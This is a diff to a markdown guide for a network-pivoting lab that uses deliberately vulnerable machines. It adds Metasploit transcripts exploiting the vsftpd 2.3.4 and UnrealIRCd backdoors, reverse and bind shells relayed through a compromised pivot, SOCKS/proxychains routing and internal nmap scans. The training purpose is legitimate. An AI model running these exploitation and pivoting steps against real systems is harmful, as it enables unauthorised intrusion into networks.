@@ -7,7 +7,7 @@ However, to make it a bit more challenging, only one of the machines is directly
 
 It's quite common in modern networks that machines will be isolated from one another by firewalls and reside in different network segments.
 To overcome this, you will need to perform lateral movement and pivot through each machine on your way to the final target.
-You will also learn how to utilise Metasploit and SOCKS proxies to daisy-chain multiple pivots.
+You will also learn how to utilise Metasploit proxies to daisy-chain multiple pivots.
 
 There will also be a network intrusion detection system monitoring the whole network for malicious behaviour.
 However, it's been set to "alert" mode, so it won't block you even once you've been detected.
@@ -16,9 +16,9 @@ You should **keep this open** while doing the lab to see what behaviours are det
 ## Pre-Requisite Knowledge
 
 - Comfortable and familiar with Linux, including using the shell, how file permissions work, SSH, etc.
-- The basics of TCP/IP and routing
-- Some scripting knowledge (Bash or Python)
-- Familiarity with the basics of Metasploit and `msfconsole`
+- Understanding the basics of TCP/IP and routing
+
+Some familiarity scripting with Bash or Python, as well the basics of Metasploit, are optional but helpful here.
 
 ## Learning Outcomes
 
@@ -46,6 +46,24 @@ The only docker command you will need is the one to view the NIDS logs, but ther
 ```
 docker logs --follow --tail=0 snort3
 ```
+
+However, feel free to Google anything or refer to the list of reading materials at the bottom.
+The targets prepared for you are commonly used, openly available machines with plenty of walkthroughs available online.
+This is a networking lab, not a Metasploit exercise.
+
+
+# Common Questions
+
+1. "What does setting the `some option` variable in Metasploit do?"
+   - It depends on the module and payload you've currently got selected.
+   Check `show options` and `show advanced` in Metasploit
+   - There's also the [extra resources](#extra-resources), and Google is your best friend.
+2. "My `nmap` scan isn't showing as many services as the examples you've got!"
+   - It takes some time for all the services to spin up, even after Vagrant has finished booting.
+   Give it another 5-10 minutes and it should be ready.
+
+
+
 
 # First Target
 
@@ -343,14 +361,19 @@ For this example, I will show how we can use the FTP server on port 21 to get re
 
 VSFTPd 2.3.4 contains a backdoor we can exploit to achieve a shell, and since the process is running as the root user we'll also get a root shell.
 We can use the metasploit module for this to automate the exploit, and we'll use our access to create a SOCKS proxy for future pivoting.
-
-First, we use metasploit to get a basic shell on the target machine.
-We will be using the `exploit/unix/ftp/vsftpd_234_backdoor` module, and then upgrading our shell to a Meterpreter session:
+To begin, open up the Metasploit console:
 
 ```
 ┌──(root㉿kali)-[~]
 └─# msfconsole
 
+msf6 > 
+```
+
+We'll use metasploit to get a basic shell on the target machine with the `exploit/unix/ftp/vsftpd_234_backdoor` module,
+and then upgrading our shell to a Meterpreter session:
+
+```
 msf6 > use exploit/unix/ftp/vsftpd_234_backdoor
 [*] No payload configured, defaulting to cmd/unix/interact
 msf6 exploit(unix/ftp/vsftpd_234_backdoor) > set RHOSTS 172.24.0.2
@@ -368,7 +391,7 @@ id
 uid=0(root) gid=0(root)
 ```
 
-As we can see, our shell is running as the root user.
+As we can see from running `id`, our shell is running as the root user.
 Next, we need to upgrade our basic shell to a Meterpreter shell.
 This is done by sending our basic shell to the background with (Ctrl+Z), and then upgrading the session with `sessions -u`
 
@@ -432,7 +455,8 @@ IPv4 Address : 172.25.0.2
 IPv4 Netmask : 255.255.255.0
 ```
 
-We can see the network we used to compromise the machine, as well as a new network `172.25.0.0/24`.
+We can see the network we used to compromise the machine (`172.24.0.0/24`), localhost (duh),
+as well as a new network - `172.25.0.0/24`.
 
 To progress further through the network you have two options:
 
@@ -440,18 +464,19 @@ To progress further through the network you have two options:
 2. Set up a proxy to tunnel traffic from our attacker machine into the internal network
 
 It's often not a good idea to upload our tools onto the compromised machine for various reasons
-(hardware limitations, lack of internet access, protecting your tools, etc.) so instead we'll pivot through the box with a proxy.
+(hardware limitations, protecting your tools, lack of root privileges, etc.),
+so instead we'll pivot through the box with a proxy.
 
 First, we need to set up a route in Metasploit for this new subnet:
 
 ```
-msf6 exploit(unix/ftp/vsftpd_234_backdoor) > use post/multi/manage/autoroute
+msf6 exploit(unix/ftp/vsftpd_234_backdoor) > `use post/multi/manage/autoroute`
+msf6 post(multi/manage/autoroute) > set SUBNET 172.25.0.0
+SUBNET => 172.25.0.0
 msf6 post(multi/manage/autoroute) > set NETMASK 24
 NETMASK => 24
 msf6 post(multi/manage/autoroute) > set SESSION 2
 SESSION => 2
-msf6 post(multi/manage/autoroute) > set SUBNET 172.25.0.0
-SUBNET => 172.25.0.0
 msf6 post(multi/manage/autoroute) > run
 
 [*] Running module against 172.24.0.2
@@ -486,7 +511,7 @@ msf6 auxiliary(server/socks_proxy) > run
 [*] Starting the SOCKS proxy server
 ```
 
-Now we have a SOCKS5 proxy running on our local machine (which by default listens on `10.0.0.0:1080`).
+Now we have a SOCKS5 proxy running on our local machine (which by default listens on `0.0.0.0:1080`).
 The last step is to add this proxy to our Proxychains4 configurations so we can use it with our other applications.
 Edit your configuration at `/etc/proxychains4.conf` using an editor of your choice and insert your new proxy at the bottom:
 
@@ -575,17 +600,191 @@ Nmap done: 1 IP address (1 host up) scanned in 154.60 seconds
 ```
 
 We can see that on ports 6667 and 6697 there is an IRC service running.
+
 You can connect to the IRC server with `proxychains irssi -c 172.25.0.2` and run the `/version` command,
 which will reveal that the server is running Unreal 3.2.8.1.
+
+You can also see this with the `irc-unrealircd-backdoor.nse` NSE script:
+
+```
+┌──(root㉿kali)-[/vagrant]
+└─# proxychains nmap --script irc-unrealircd-backdoor.nse -p 6667,6697 172.25.0.2
+[proxychains] config file found: /etc/proxychains4.conf
+[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
+[proxychains] DLL init: proxychains-ng 4.17
+Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-07-17 23:14 EDT
+Nmap scan report for 172.25.0.2
+Host is up (0.000075s latency).
+
+PORT     STATE SERVICE
+6667/tcp open  irc
+|_irc-unrealircd-backdoor: Looks like trojaned version of unrealircd. See http://seclists.org/fulldisclosure/2010/Jun/277
+6697/tcp open  ircs-u
+|_irc-unrealircd-backdoor: Looks like trojaned version of unrealircd. See http://seclists.org/fulldisclosure/2010/Jun/277
+MAC Address: 02:42:AC:19:00:02 (Unknown)
+
+Nmap done: 1 IP address (1 host up) scanned in 17.50 seconds
+```
+
 This particular version is vulnerable to a known exploit thanks to an old backdoor, so we can use Metasploit to pop a shell.
-
-## Getting A Shell
-
 Again, feel free to use whatever vulnerability you want here to gain access to the server,
 but for this example I'll demonstrate exploiting the UnrealIRC service.
 
-To begin, we'll open our previous Metasploit console and use the 
+## Selecting a Payload
 
+Fortunately, Metasploit comes with the `unix/irc/unreal_ircd_3281_backdoor` module just for this exploit.
+
+Setting up a listener will be more complicated this time as we're pivoting through our session on the first machine.
+This is also dependent on the payload we try to deploy.
+You can list all the available payloads for a given module with `show payloads` in your Metasploit console
+
+It must fit two criteria :
+
+1. It only uses tools that the target has (it doesn't have `telnet`, and I spent too many hours figuring that out)
+2. It can set up the listener on/through our previous session
+
+We can either set up a bind shell listener on the target and connect to it through our previous session,
+or we can set up a reverse shell listener in our previous session and connect back to it from our target.
+
+For the reverse shell, set `LHOST` to the IP address of the pivot on the same network as the target,
+and `LPORT` (the listening port on our pivot session) to an unused port.
+You can check which ports are in use by running `netstat -a` in your Meterpreter session.
+You'll need to use an unprivileged port (higher than 1024) if you didn't get root privileges previously.
+Finally, you'll need to set the `ReverseListenerComm` option to the session you want to pivot through
+(your first Meterpreter session should be session 2)
+
+```
+msf6 exploit(unix/irc/unreal_ircd_3281_backdoor) > set payload 8
+payload => cmd/unix/reverse_perl
+msf6 exploit(unix/irc/unreal_ircd_3281_backdoor) > set LHOST 172.25.0.3
+LHOST => 172.25.0.3
+msf6 exploit(unix/irc/unreal_ircd_3281_backdoor) > set LPORT 11337
+LPORT => 11337
+msf6 exploit(unix/irc/unreal_ircd_3281_backdoor) > set ReverseListenerComm 2
+ReverseListenerComm => 2
+msf6 exploit(unix/irc/unreal_ircd_3281_backdoor) > run
+
+[*] Started reverse TCP handler on 172.25.0.3:11337 via the meterpreter on session 2
+[*] 172.25.0.2:6667 - Connected to 172.25.0.2:6667...
+    :irc.TestIRC.net NOTICE AUTH :*** Looking up your hostname...
+    :irc.TestIRC.net NOTICE AUTH :*** Couldn't resolve your hostname; using your IP address instead
+[*] 172.25.0.2:6667 - Sending backdoor command...
+[*] Command shell session 3 opened (172.25.0.3:11337 -> 172.25.0.2:59464 via session 2) at 2024-07-17 23:32:23 -0400
+
+id
+uid=1121(boba_fett) gid=100(users) groups=100(users)
+```
+
+Alternatively, using a bind shell is slightly simpler.
+You'll need to set `LPORT` (the port on the target which the shell will listen on) to an unused port.
+We can't just check with `netstat -a` since we don't have access yet,
+but a good start would be to pick an unprivileged port that didn't show up in your nmap scan,
+and one that's not [commonly used](https://en.wikipedia.org/wiki/List_of_TCP_and_UDP_port_numbers#Well-known_ports).
+
+```
+msf6 exploit(unix/irc/unreal_ircd_3281_backdoor) > set payload 1
+payload => cmd/unix/bind_perl
+msf6 exploit(unix/irc/unreal_ircd_3281_backdoor) > set LPORT 21337
+LPORT => 21337
+msf6 exploit(unix/irc/unreal_ircd_3281_backdoor) > exploit
+
+[*] 172.25.0.2:6667 - Connected to 172.25.0.2:6667...
+    :irc.TestIRC.net NOTICE AUTH :*** Looking up your hostname...
+    :irc.TestIRC.net NOTICE AUTH :*** Couldn't resolve your hostname; using your IP address instead
+[*] 172.25.0.2:6667 - Sending backdoor command...
+[*] Started bind TCP handler against 172.25.0.2:21337
+[*] Command shell session 5 opened (172.25.0.3:50822 -> 172.25.0.2:21337 via session 2) at 2024-07-17 23:48:41 -0400
+
+id
+uid=1121(boba_fett) gid=100(users) groups=100(users)
+```
+
+Now we have a basic shell running as the `boba_fett`.
+Same as last time, you can upgrade this shell to a Meterpreter session with `sessions -i -1`.
+
+## Setting up a route
+
+Running `ifconfig` on your new Meterpreter session will show that you've found another network:
+
+```
+msf6 post(multi/recon/local_exploit_suggester) > sessions -i 6
+[*] Starting interaction with 6...
+
+meterpreter > ifconfig
+
+Interface  1
+============
+Name         : lo
+Hardware MAC : 00:00:00:00:00:00
+MTU          : 65536
+Flags        : UP,LOOPBACK
+IPv4 Address : 127.0.0.1
+IPv4 Netmask : 255.0.0.0
+IPv6 Address : ::1
+IPv6 Netmask : ffff:ffff:ffff:ffff:ffff:ffff::
+
+
+Interface 20
+============
+Name         : middle_net0
+Hardware MAC : 02:42:ac:19:00:02
+MTU          : 1500
+Flags        : UP,BROADCAST,MULTICAST
+IPv4 Address : 172.25.0.2
+IPv4 Netmask : 255.255.255.0
+
+
+Interface 26
+============
+Name         : inner_net0
+Hardware MAC : 02:42:ac:1a:00:03
+MTU          : 1500
+Flags        : UP,BROADCAST,MULTICAST
+IPv4 Address : 172.26.0.3
+IPv4 Netmask : 255.255.255.0
+```
+
+We can add this new network to our Metasploit routing table same as last time:
+
+```
+msf6 post(multi/recon/local_exploit_suggester) > use post/multi/manage/autoroute
+msf6 post(multi/manage/autoroute) > set SUBNET 172.26.0.0
+SUBNET => 172.26.0.0
+msf6 post(multi/manage/autoroute) > set SUBNET 172.26.0.0
+SUBNET => 172.26.0.0
+msf6 post(multi/manage/autoroute) > set NETMASK 24
+NETMASK => 24
+msf6 post(multi/manage/autoroute) > set SESSION 6
+SESSION => 6
+msf6 post(multi/manage/autoroute) > run
+
+[*] Running module against 172.26.0.3
+[*] Searching for subnets to autoroute.
+[+] Route added to subnet 172.26.0.0/255.255.255.0 from host's routing table.
+[*] Post module execution completed
+msf6 post(multi/manage/autoroute) > 
+```
+
+Now we can access this network through our existing SOCKS proxy using `proxychains4` on our own machine.
+
+```
+┌──(root㉿kali)-[/vagrant]
+└─# proxychains nmap -sSV -T5 -p0-65535 172.26.0.2 
+[proxychains] config file found: /etc/proxychains4.conf
+[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
+[proxychains] DLL init: proxychains-ng 4.17
+Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-07-18 02:06 EDT
+Nmap scan report for 172.26.0.2
+Host is up (0.0000080s latency).
+Not shown: 65534 closed tcp ports (reset)
+PORT    STATE SERVICE  VERSION
+80/tcp  open  http     Apache httpd 2.4.7 ((Ubuntu))
+443/tcp open  ssl/http Apache httpd 2.4.7 ((Ubuntu))
+MAC Address: 02:42:AC:1A:00:02 (Unknown)
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 108.03 second
+```
 # Final box
 
 This is running a web service called Hackazon
@@ -687,3 +886,29 @@ msf6 exploit(multi/handler) > sessions -i 3
 meterpreter >
 ```
 
+# Extra Resources
+
+Here are some extra reading materials I've prepared for the exposed services in case you're interested or stuck:
+
+- [Nmap](reconnaissance.md#nmap)
+- [Scanning Websites](reconnaissance.md#automated-web-application-scanners)
+- [Path Enumeration](reconnaissance.md#path-enumeration)
+- [SMB Enumeration](reconnaissance.md#smb-enumeration)
+- [NFS Enumeration](reconnaissance.md#nfs-enumeration)
+- [FTP Enumeration](reconnaissance.md#ftp-enumeration)
+- [SMTP Enumeration](reconnaissance.md#smtp-enumeration)
+- [SNMP Enumeration](reconnaissance.md#snmp-enumeration)
+- [WebDAV Enumeration](reconnaissance.md#webdav-enumeration)
+
+As well as some links I found useful:
+
+- [Custom Host Discovery Scans](https://nmap.org/book/man-host-discovery.html)
+- [Autoroute, SOCKS, and Proxychains4](https://docs.metasploit.com/docs/using-metasploit/intermediate/pivoting-in-metasploit.html)
+- [Reverse Shells (OpenBSD and more)](https://kb.systemoverlord.com/security/postex/reverse/)
+- [Upgrading a shell to Meterpreter](https://docs.metasploit.com/docs/pentesting/metasploit-guide-upgrading-shells-to-meterpreter.html)
+- [UnrealIRC Backdoor](https://pentesthacker.wordpress.com/2021/01/10/hack-metasploitable-with-unrealirc-backdoor/)
+- [Reverse Shell through a Pivot](https://pwn.no0.be/post/windows/pivoting/)
+
+- [Metasploitable2 Walkthrough](https://docs.rapid7.com/metasploit/metasploitable-2-exploitability-guide/)
+- [Metasploitable3 Walkthrough](https://stuffwithaurum.com/2020/04/17/metasploitable-3-linux-an-exploitation-guide/)
+- [Hackazon Walkthrough](https://docs.rapid7.com/appspider/conducting-a-basic-test-manually-against-hackazon/)
